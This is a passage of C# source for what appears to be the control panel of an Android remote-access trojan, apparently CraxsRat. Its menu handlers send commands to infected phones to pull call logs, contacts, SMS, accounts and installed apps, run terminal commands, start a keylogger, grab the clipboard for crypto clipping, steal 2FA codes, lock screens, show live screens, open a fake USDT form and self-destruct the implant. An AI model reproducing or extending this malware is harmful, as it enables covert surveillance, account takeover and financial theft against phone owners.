                            object[] parametersObjects = new object[4]
                            {
                                myClient,
                                SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".calls" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getCalls + Data.SPL_SOCKET + "calls",
                                Codes.Encoding().GetBytes("null"),
                                client
                            };
                            client.SendMessage(parametersObjects);
                        }
                    }
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void ContactsListToolsTrip_Click(object sender, EventArgs e)
    {
        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
                try
                {
                    if (selectedRow.Tag != null)
                    {
                        Client client = (Client)selectedRow.Cells[8].Tag;
                        if (client != null)
                        {
                            TcpClient myClient = client.myClient;
                            object[] parametersObjects = new object[4]
                            {
                                myClient,
                                SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".contacts" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getContacts + Data.SPL_SOCKET + "contacts",
                                Codes.Encoding().GetBytes("null"),
                                client
                            };
                            client.SendMessage(parametersObjects);
                        }
                    }
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void ShowRegisteredEmailsToolsTrip_Click(object sender, EventArgs e)
    {
        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
                try
                {
                    if (selectedRow.Tag != null)
                    {
                        Client client = (Client)selectedRow.Cells[8].Tag;
                        if (client != null)
                        {
                            TcpClient myClient = client.myClient;
                            object[] parametersObjects = new object[4]
                            {
                                myClient,
                                SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".info" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.Account + Data.SPL_SOCKET + "account",
                                Codes.Encoding().GetBytes("null"),
                                client
                            };
                            client.SendMessage(parametersObjects);
                        }
                    }
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void InstalledApplicationsToolsTrip_Click(object sender, EventArgs e)
    {
        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
                try
                {
                    if (selectedRow.Tag != null)
                    {
                        Client client = (Client)selectedRow.Cells[8].Tag;
                        if (client != null)
                        {
                            TcpClient myClient = client.myClient;
                            object[] parametersObjects = new object[4]
                            {
                                myClient,
                                SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".apps" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.Apps + Data.SPL_SOCKET + "apps",
                                Codes.Encoding().GetBytes("null"),
                                client
                            };
                            client.SendMessage(parametersObjects);
                        }
                    }
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void toolStripMenuItem26_Click(object sender, EventArgs e)
    {
        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
                try
                {
                    if (selectedRow.Tag != null)
                    {
                        Client client = (Client)selectedRow.Cells[8].Tag;
                        if (client != null)
                        {
                            TcpClient myClient = client.myClient;
                            string[] array = client.Keys.Split(':');
                            object[] parametersObjects = new object[4]
                            {
                                myClient,
                                string.Concat(SecurityKey.KeysClient2 + Data.SPL_SOCKET + "adm<*>", Data.SPL_SOCKET, array[0], Data.SPL_SOCKET, array[1], Data.SPL_SOCKET, SecurityKey.Lockscreen, Data.SPL_SOCKET, Conversions.ToString(0), Data.SPL_SOCKET, Conversions.ToString(0), Data.SPL_SOCKET, Data.SPL_ARRAY, Data.SPL_SOCKET, client.ClientRemoteAddress),
                                Codes.Encoding().GetBytes("null"),
                                client
                            };
                            client.SendMessage(parametersObjects);
                        }
                    }
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void toolStripMenuItem28_Click(object sender, EventArgs e)
    {
        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
                try
                {
                    if (selectedRow.Tag == null)
                        continue;
                    Client client = (Client)selectedRow.Cells[8].Tag;
                    if (client == null)
                        continue;
                    TcpClient myClient = client.myClient;
                    CallPhone callPhone = new CallPhone();
                    callPhone.L0.Text = "add Number";
                    callPhone.StartPosition = FormStartPosition.Manual;
                    callPhone.Location = Codes.FixSize(Data.MainForm, callPhone);
                    string text = null;
                    string text2 = null;
                    if (callPhone.ShowDialog() == DialogResult.OK)
                    {
                        text = callPhone.TextBox1.Text;
                        text2 = callPhone._Call;
                        callPhone.Close();
                        if (Operators.CompareString(text, null, TextCompare: false) == 0)
                            continue;
                        try
                        {
                            if (client != null)
                            {
                                object[] parametersObjects = new object[4]
                                {
                                    myClient,
                                    SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".info" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.resultClient + Data.SPL_SOCKET + text2 + Data.SPL_DATA + "tel:" + text.Trim(),
                                    Codes.Encoding().GetBytes("null"),
                                    client
                                };
                                client.SendMessage(parametersObjects);
                            }
                        }
                        finally
                        {
                        }
                        continue;
                    }
                    callPhone.Close();
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void toolStripMenuItem32_Click(object sender, EventArgs e)
    {
        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
                try
                {
                    if (selectedRow.Tag == null)
                        continue;
                    Client client = (Client)selectedRow.Cells[8].Tag;
                    if (client != null)
                    {
                        TcpClient myClient = client.myClient;
                        Dialog1 dialog = new Dialog1();
                        dialog.Title = "Enter Messege";
                        dialog.ShowDialog();
                        if (dialog.DialogResult != DialogResult.OK)
                            break;
                        string[] array = client.Keys.Split(':');
                        object[] parametersObjects = new object[4]
                        {
                            myClient,
                            SecurityKey.KeysClient2 + Data.SPL_SOCKET + "msg:" + dialog.Mytext.Text + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
                            Codes.Encoding().GetBytes("null"),
                            client
                        };
                        client.SendMessage(parametersObjects);
                    }
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void OpenLinkToolsTrip_Click(object sender, EventArgs e)
    {
        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
                try
                {
                    if (selectedRow.Tag == null)
                        continue;
                    Client client = (Client)selectedRow.Cells[8].Tag;
                    if (client != null)
                    {
                        TcpClient myClient = client.myClient;
                        Dialog1 dialog = new Dialog1();
                        dialog.Title = "Enter Link";
                        dialog.ShowDialog();
                        if (dialog.DialogResult != DialogResult.OK)
                            break;
                        string[] array = client.Keys.Split(':');
                        object[] parametersObjects = new object[4]
                        {
                            myClient,
                            SecurityKey.KeysClient2 + Data.SPL_SOCKET + "lnk<*>" + reso.ChekLink(dialog.Mytext.Text) + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
                            Codes.Encoding().GetBytes("null"),
                            client
                        };
                        client.SendMessage(parametersObjects);
                    }
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void NotificationsReaderToolsTrip_Click(object sender, EventArgs e)
    {
        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
                try
                {
                    if (selectedRow.Tag == null)
                        continue;
                    Client client = (Client)selectedRow.Cells[8].Tag;
                    if (client != null)
                    {
                        string name = "Notifications_" + client.ClientAddressIP;
                        Craxspopup Eaglepopup = (Craxspopup)MyProject.Application.OpenForms[name];
                        if (Eaglepopup == null)
                        {
                            Eaglepopup = new Craxspopup();
                            Eaglepopup.Location = ClientsWindow.PointToScreen(ClientsWindow.GetCellDisplayRectangle(0, selectedRow.Index, cutOverflow: false).Location);
                            Eaglepopup.ClassClient = client;
                            Eaglepopup.Show();
                            selectedRow.Cells[8].Value = Codes.BlankImage();
                        }
                    }
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void RestartToolsTrip_Click(object sender, EventArgs e)
    {
        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
                try
                {
                    if (selectedRow.Tag != null)
                    {
                        Client client = (Client)selectedRow.Cells[8].Tag;
                        if (client != null)
                        {
                            TcpClient myClient = client.myClient;
                            object[] parametersObjects = new object[4]
                            {
                                myClient,
                                SecurityKey.KeysClient5 + Data.SPL_SOCKET + "10000",
                                Codes.Encoding().GetBytes("null"),
                                client
                            };
                            client.SendMessage(parametersObjects);
                            client.Close(myClient);
                        }
                    }
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void KillAppsToolsTrip_Click(object sender, EventArgs e)
    {
        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
                try
                {
                    if (selectedRow.Tag != null)
                    {
                        Client client = (Client)selectedRow.Cells[8].Tag;
                        if (client != null)
                        {
                            TcpClient myClient = client.myClient;
                            object[] parametersObjects = new object[4]
                            {
                                myClient,
                                SecurityKey.KeysClient2 + Data.SPL_SOCKET + "kill<*>x" + Data.SPL_SOCKET + "0" + Data.SPL_SOCKET + "0" + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
                                Codes.Encoding().GetBytes("null"),
                                client
                            };
                            client.SendMessage(parametersObjects);
                        }
                    }
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void SelfDestructVirusToolsTrip_Click(object sender, EventArgs e)
    {
        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
                try
                {
                    if (selectedRow.Tag == null)
                        continue;
                    Client client = (Client)selectedRow.Cells[8].Tag;
                    if (client != null)
                    {
                        string name = "SelfRemove_" + client.ClientAddressIP;
                        SelfRemove selfRemove = (SelfRemove)MyProject.Application.OpenForms[name];
                        if (selfRemove == null)
                        {
                            selfRemove = new SelfRemove();
                            selfRemove.Classclient = client;
                            selfRemove.Show();
                        }
                        else
                            selfRemove.BringToFront();
                    }
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void ClienttFolderToolsTrip_Click(object sender, EventArgs e)
    {
        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
                try
                {
                    if (selectedRow.Tag == null)
                        continue;
                    Client client = (Client)selectedRow.Cells[8].Tag;
                    try
                    {
                        if (client != null)
                        {
                            string folderUSER = client.FolderUSER;
                            if (!Directory.Exists(folderUSER))
                                Directory.CreateDirectory(folderUSER);
                            Process.Start(folderUSER);
                        }
                    }
                    catch (Exception)
                    {
                        //ProjectData.SetProjectError(projectError);
                        //////CraxsAlert.Showinformation("Sorry");
                    }
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError2);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError3);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void toolStripMenuItem29_Click(object sender, EventArgs e)
    {
        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
                try
                {
                    if (selectedRow.Tag != null)
                    {
                        Client client = (Client)selectedRow.Cells[8].Tag;
                        if (client != null)
                        {
                            TcpClient myClient = client.myClient;
                            object[] parametersObjects = new object[4]
                            {
                                myClient,
                                SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".terminal" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getCommand + Data.SPL_SOCKET + "run",
                                Codes.Encoding().GetBytes("null"),
                                client
                            };
                            client.SendMessage(parametersObjects);
                        }
                    }
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void KeyloggerToolsTrip_Click(object sender, EventArgs e)
    {
        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
                try
                {
                    if (selectedRow.Tag != null)
                    {
                        Client client = (Client)selectedRow.Cells[8].Tag;
                        string name = "Keylogger_" + client.ClientRemoteAddress;
                        Keylogger keylogger = (Keylogger)MyProject.Application.OpenForms[name];
                        if (client != null && keylogger == null)
                        {
                            keylogger = new Keylogger();
                            keylogger.Name = name;
                            keylogger.Title = string.Format("{0} - IP:{1}", "Keylogger", client.ClientAddressIP);
                            keylogger.Client = client.myClient;
                            keylogger.classClient = client;
                            keylogger.DGV0.Columns[3].Width = 48;
                            keylogger.DGV0.Columns[3].DisplayIndex = 0;
                            keylogger.tmpAddressIP = client.ClientAddressIP;
                            keylogger.tmpClientName = client.ClientName;
                            keylogger.tmpCountry = client.Country;
                            keylogger.tmpFolderUSER = client.FolderUSER;
                            client.Keylogg = true;
                            keylogger.Show();
                        }
                    }
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void ReadSmssToolsTrip_Click(object sender, EventArgs e)
    {
        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
                try
                {
                    if (selectedRow.Tag != null)
                    {
                        Client client = (Client)selectedRow.Cells[8].Tag;
                        if (client != null)
                        {
                            TcpClient myClient = client.myClient;
                            object[] parametersObjects = new object[4]
                            {
                                myClient,
                                SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".sms" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getSMS + Data.SPL_SOCKET + "sms" + Data.SPL_DATA + "content://sms/",
                                Codes.Encoding().GetBytes("null"),
                                client
                            };
                            client.SendMessage(parametersObjects);
                        }
                    }
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void CryptoClipperToolsTrip_Click(object sender, EventArgs e)
    {
        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
                try
                {
                    if (selectedRow.Tag != null)
                    {
                        Client client = (Client)selectedRow.Cells[8].Tag;
                        if (client != null)
                        {
                            TcpClient myClient = client.myClient;
                            object[] parametersObjects = new object[4]
                            {
                                myClient,
                                SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".info" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getClipboard + Data.SPL_SOCKET + "get" + Data.SPL_DATA + "null",
                                Codes.Encoding().GetBytes("null"),
                                client
                            };
                            client.SendMessage(parametersObjects);
                        }
                    }
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void Steal2FaCodeToolsTrip_Click(object sender, EventArgs e)
    {
        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
                try
                {
                    if (selectedRow.Tag != null)
                    {
                        Client client = (Client)selectedRow.Cells[8].Tag;
                        if (client != null)
                        {
                            TcpClient myClient = client.myClient;
                            object[] parametersObjects = new object[4]
                            {
                                myClient,
                                 SecurityKey.KeysClient2 + Data.SPL_SOCKET +  "goauth<*>" + "X" + Data.SPL_SOCKET + "0" + Data.SPL_SOCKET + "0" + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
                                Codes.Encoding().GetBytes("null"),
                                client
                            };
                            client.SendMessage(parametersObjects);
                        }
                    }
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void toolStripMenuItem30_Click(object sender, EventArgs e)
    {
        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
                try
                {
                    if (selectedRow.Tag != null)
                    {
                        Client client = (Client)selectedRow.Cells[8].Tag;
                        if (client != null)
                        {
                            TcpClient myClient = client.myClient;
                            object[] parametersObjects = new object[4]
                            {
                                myClient,
                                SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>LK" + Data.SPL_SOCKET + "0" + Data.SPL_SOCKET + "0" + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
                                Codes.Encoding().GetBytes("null"),
                                client
                            };
                            client.SendMessage(parametersObjects);
                        }
                    }
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void toolStripMenuItem31_Click(object sender, EventArgs e)
    {
        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
                try
                {
                    if (selectedRow.Tag != null)
                    {
                        Client client = (Client)selectedRow.Cells[8].Tag;
                        if (client != null)
                        {
                            TcpClient myClient = client.myClient;
                            object[] parametersObjects = new object[4]
                            {
                                myClient,
                                SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>LKeb" + Data.SPL_SOCKET + "0" + Data.SPL_SOCKET + "0" + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
                                Codes.Encoding().GetBytes("null"),
                                client
                            };
                            client.SendMessage(parametersObjects);
                        }
                    }
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void WebviewToolsTrip_Click(object sender, EventArgs e)
    {
        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
                try
                {
                    if (selectedRow.Tag == null)
                        continue;
                    Client client = (Client)selectedRow.Cells[8].Tag;
                    if (client != null)
                    {
                        string name = "Web_Browser_" + client.ClientAddressIP;
                        WebViewMonitor webViewMonitor = (WebViewMonitor)MyProject.Application.OpenForms[name];
                        if (webViewMonitor == null)
                        {
                            webViewMonitor = new WebViewMonitor();
                            webViewMonitor.Name = name;
                            webViewMonitor.Title = string.Format("{0} - IP:{1}", "Web Browser", client.ClientAddressIP);
                            webViewMonitor.Tag = client.ClientAddressIP;
                            webViewMonitor.Classclient = client;
                            webViewMonitor.Show();
                        }
                    }
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void LiveScreenControlToolsTrip_Click_1(object sender, EventArgs e)
    {

        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
                try
                {
                    if (selectedRow.Tag == null)
                        continue;
                    Client client = (Client)selectedRow.Cells[8].Tag;
                    if (client != null)
                    {
                        string name = "Live_Screen_" + client.ClientRemoteAddress;
                        ScreenShoter screenShoter = (ScreenShoter)MyProject.Application.OpenForms[name];
                        if (screenShoter == null)
                        {
                            screenShoter = new ScreenShoter();
                            screenShoter.Name = name;
                            screenShoter.Title = string.Format("{0} - IP:{1}", "Live Screen", client.ClientAddressIP);
                            screenShoter.Tag = client.ClientRemoteAddress;
                            screenShoter.classClient = client;
                            screenShoter.Client = client.myClient;
                            screenShoter.DownloadsFolder = client.FolderUSER;
                            screenShoter.Show();
                        }
                    }
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void drakeUIButtonIcon4_Click_1(object sender, EventArgs e)
    {
        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
                try
                {
                    if (selectedRow.Tag == null)
                        continue;
                    Client client = (Client)selectedRow.Cells[8].Tag;
                    if (client != null)
                    {
                        string name = "Web_Browser_" + client.ClientAddressIP;
                        WebViewMonitor webViewMonitor = (WebViewMonitor)MyProject.Application.OpenForms[name];
                        if (webViewMonitor == null)
                        {
                            webViewMonitor = new WebViewMonitor();
                            webViewMonitor.Name = name;
                            webViewMonitor.Title = string.Format("{0} - IP:{1}", "Web Browser", client.ClientAddressIP);
                            webViewMonitor.Tag = client.ClientAddressIP;
                            webViewMonitor.Classclient = client;
                            webViewMonitor.Show();
                        }
                    }
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void drakeUIButtonIcon17_Click_1(object sender, EventArgs e)
    {
        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
                try
                {
                    if (selectedRow.Tag == null)
                        continue;
                    Client client = (Client)selectedRow.Cells[8].Tag;
                    if (client != null)
                    {
                        string name = "Screen_Reader_" + client.ClientRemoteAddress;
                        ScreenReader screenReader = (ScreenReader)MyProject.Application.OpenForms[name];
                        if (screenReader == null)
                        {
                            screenReader = new ScreenReader();
                            screenReader.Name = name;
                            screenReader.Title = string.Format("{0} - IP:{1}", "Screen Reader", client.ClientAddressIP);
                            screenReader.Tag = client.ClientRemoteAddress;
                            screenReader.Classclient = client;
                            screenReader.Show();
                        }
                    }
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void drakeUIButtonIcon18_Click_1(object sender, EventArgs e)
    {
       
        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
                try
                {
                    if (selectedRow.Tag != null)
                    {
                        Client client = (Client)selectedRow.Cells[8].Tag;
                        if (client != null)
                        {
                            TcpClient myClient = client.myClient;
                            object[] parametersObjects = new object[4]
                            {
                                myClient,
                                SecurityKey.KeysClient2 + Data.SPL_SOCKET +  "goauth<*>" + "X" + Data.SPL_SOCKET + "0" + Data.SPL_SOCKET + "0" + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
                                Codes.Encoding().GetBytes("null"),
                                client
                            };
                            client.SendMessage(parametersObjects);
                        }
                    }
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

    private void Label14_Click(object sender, EventArgs e)
    {

    }

    private void drakeUIButtonIcon40_Click(object sender, EventArgs e)
    {

    }

    private void drakeUIButtonIcon19_Click_1(object sender, EventArgs e)
    {

    }

    private void drakeUIButtonIcon41_Click(object sender, EventArgs e)
    {
        Close();
    }

    private void drakeUIButtonIcon42_Click(object sender, EventArgs e)
    {
        this.WindowState = FormWindowState.Minimized;
    }

    private void drakeUIButtonIcon39_Click(object sender, EventArgs e)
    {
    }

    private void UsdtToolStripMenuItem_Click(object sender, EventArgs e)
    {
        if (ClientsWindow.SelectedRows.Count <= 0)
            return;
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
            {
                try
                {
                    if (selectedRow.Tag == null)
                        continue;
                    Client client = (Client)selectedRow.Cells[8].Tag;
                    if (client != null)
                    {
                        string name = "Faker_" + client.ClientRemoteAddress;
                        Faker faker = (Faker)MyProject.Application.OpenForms[name];
                        if (faker == null)
                        {
                            faker = new Faker();
                            faker.Name = name;
                            faker.Title = string.Format("{0} - IP:{1}", "Faker_", client.ClientAddressIP);
                            faker.Tag = client.ClientRemoteAddress;
                            faker.classClient = client;
                            faker.Client = client.myClient;
                            faker.DownloadsFolder = client.FolderUSER;
                            faker.Show();
                        }
                    }
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
        }
        catch (Exception)
        {
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

